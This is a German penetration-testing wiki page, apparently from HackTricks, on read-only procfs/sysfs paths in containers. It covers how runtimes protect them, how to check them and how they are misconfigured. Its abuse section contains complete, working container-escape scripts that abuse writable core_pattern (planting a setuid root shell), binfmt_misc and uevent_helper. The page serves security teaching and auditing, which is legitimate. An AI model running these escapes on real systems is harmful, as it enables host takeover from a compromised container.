# Schreibgeschützte Systempfade

{{#include ../../../../banners/hacktricks-training.md}}

Schreibgeschützte Systempfade sind ein separater Schutzmechanismus, unabhängig von masked paths. Anstatt einen Pfad vollständig zu verbergen, macht die Runtime ihn sichtbar, bindet ihn aber schreibgeschützt ein. Das ist üblich für ausgewählte procfs and sysfs-Stellen, bei denen Lesezugriff akzeptabel oder betrieblich notwendig sein kann, Schreibzugriffe jedoch zu gefährlich wären.

Der Zweck ist einfach: Viele Kernel-Schnittstellen werden deutlich gefährlicher, wenn sie beschreibbar sind. Ein schreibgeschütztes Mount entfernt nicht den gesamten Aufklärungswert, verhindert aber, dass ein kompromittierter Prozess die darunterliegenden kernel-nahen Dateien über diesen Pfad verändert.

## Funktionsweise

Runtimes markieren häufig Teile der proc/sys-Ansicht als schreibgeschützt. Je nach Runtime und Host kann dies Pfade wie die folgenden einschließen:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Die konkrete Liste variiert, das Modell bleibt jedoch gleich: Sichtbarkeit dort erlauben, wo sie nötig ist, und Änderungen standardmäßig verweigern.

## Lab

Untersuche die von Docker deklarierten schreibgeschützten Pfade:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Untersuche die gemountete proc/sys-Ansicht innerhalb des Containers:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Sicherheitsauswirkung

Schreibgeschützte Systempfade schränken eine große Klasse von Host-beeinträchtigendem Missbrauch ein. Selbst wenn ein Angreifer procfs oder sysfs inspizieren kann, entfernt das fehlende Schreibrecht dort viele direkte Modifikationspfade, die kernel tunables, crash handlers, module-loading helpers oder andere control interfaces betreffen. Die Gefährdung ist nicht verschwunden, aber der Übergang von information disclosure zu Einfluss auf den Host wird erschwert.

## Fehlkonfigurationen

Die Hauptfehler sind das Unmasking oder Remounting sensibler Pfade als read-write, das direkte Exponieren von host proc/sys-Inhalten mittels writable bind mounts oder die Nutzung von privileged modes, die die sichereren Runtime-Defaults effektiv umgehen. In Kubernetes stehen `procMount: Unmasked` und privileged workloads häufig mit schwächerem proc-Schutz in Verbindung. Ein weiterer häufiger Betriebsfehler ist die Annahme, dass weil die Runtime diese Pfade normalerweise read-only mountet, alle Workloads weiterhin dieses Default erben.

## Missbrauch

Wenn der Schutz schwach ist, beginnen Sie damit, nach writable proc/sys-Einträgen zu suchen:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wenn schreibbare Einträge vorhanden sind, gehören folgende besonders wertvolle Folgepfade dazu:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Was diese Befehle offenbaren können:

- Schreibbare Einträge unter `/proc/sys` bedeuten oft, dass der container das Verhalten des host-Kernels verändern kann, anstatt es nur zu inspizieren.
- `core_pattern` ist besonders wichtig, weil ein schreibbarer host-facing Wert in einen host code-execution path verwandelt werden kann, indem man nach dem Setzen eines pipe handlers einen Prozess zum Absturz bringt.
- `modprobe` zeigt den Helper, den der Kernel für module-loading-bezogene Abläufe verwendet; es ist ein klassisches high-value Ziel, wenn es schreibbar ist.
- `binfmt_misc` zeigt, ob die Registrierung benutzerdefinierter Interpreter möglich ist. Ist die Registrierung schreibbar, kann dies statt nur eines information leak zu einer execution primitive werden.
- `panic_on_oom` steuert eine hostweite Kernel-Entscheidung und kann daher Ressourcenerschöpfung in einen host denial of service verwandeln.
- `uevent_helper` ist eines der deutlichsten Beispiele dafür, dass ein schreibbarer sysfs-Helper-Pfad host-context execution ermöglicht.

Interessante Befunde sind schreibbare, host-facing proc-Knobs oder sysfs-Einträge, die normalerweise read-only sein sollten. An diesem Punkt hat sich die Workload von einer eingeschränkten container-Sicht hin zu bedeutsamem Einfluss auf den Kernel verschoben.

### Vollständiges Beispiel: `core_pattern` Host Escape

Wenn `/proc/sys/kernel/core_pattern` von innerhalb des container schreibbar ist und auf die host kernel-Ansicht zeigt, kann es missbraucht werden, um nach einem Absturz eine Payload auszuführen:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Wenn der Pfad tatsächlich den Host-Kernel erreicht, läuft das payload auf dem Host und hinterlässt eine setuid-Shell.

### Vollständiges Beispiel: `binfmt_misc` Registrierung

Wenn `/proc/sys/fs/binfmt_misc/register` beschreibbar ist, kann eine benutzerdefinierte Interpreter-Registrierung Codeausführung erzeugen, wenn die passende Datei ausgeführt wird:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Auf einem hostseitig zugänglichen, beschreibbaren `binfmt_misc` führt dies zu Codeausführung im vom Kernel aufgerufenen Interpreter-Pfad.

### Vollständiges Beispiel: `uevent_helper`

Wenn `/sys/kernel/uevent_helper` beschreibbar ist, kann der Kernel ein Host-Pfad-Hilfsprogramm aufrufen, wenn ein passendes Event ausgelöst wird:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Der Grund, warum das so gefährlich ist, ist, dass der helper path aus der Perspektive des Host-Dateisystems aufgelöst wird, anstatt aus einem sicheren, nur im Container vorhandenen Kontext.

## Überprüfungen

Diese Überprüfungen bestimmen, ob die procfs/sysfs-Exposition an den erwarteten Stellen schreibgeschützt ist und ob die workload weiterhin sensible Kernel-Schnittstellen verändern kann.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Was hier interessant ist:

- Eine normal gehärtete Workload sollte nur sehr wenige beschreibbare proc/sys-Einträge offenlegen.
- Beschreibbare `/proc/sys`-Pfade sind oft wichtiger als bloßer Lesezugriff.
- Wenn die Runtime angibt, ein Pfad sei schreibgeschützt, er sich in der Praxis aber als beschreibbar erweist, prüfen Sie sorgfältig Mount-Propagation, Bind-Mounts und Privilegieneinstellungen.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig aktiviert | Docker legt eine standardmäßige Liste schreibgeschützter Pfade für sensible proc-Einträge fest | exposing host proc/sys mounts, `--privileged` |
| Podman | Standardmäßig aktiviert | Podman wendet standardmäßige schreibgeschützte Pfade an, sofern nicht explizit gelockert | `--security-opt unmask=ALL`, weitreichende Host-Mounts, `--privileged` |
| Kubernetes | Erbt die Runtime-Standardeinstellungen | Verwendet das zugrunde liegende Runtime-Modell schreibgeschützter Pfade, sofern nicht durch Pod-Einstellungen oder Host-Mounts abgeschwächt | `procMount: Unmasked`, privilegierte Workloads, beschreibbare host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime-Standard | Gewöhnlich verlassen sie sich auf OCI/runtime defaults | wie in der Kubernetes-Zeile; direkte Runtime-Konfigurationsänderungen können das Verhalten abschwächen |

Der Kernpunkt ist, dass schreibgeschützte Systempfade normalerweise als Runtime-Standard vorhanden sind, sich aber leicht durch privilegierte Modi oder Host-Bind-Mounts untergraben lassen.
{{#include ../../../../banners/hacktricks-training.md}}
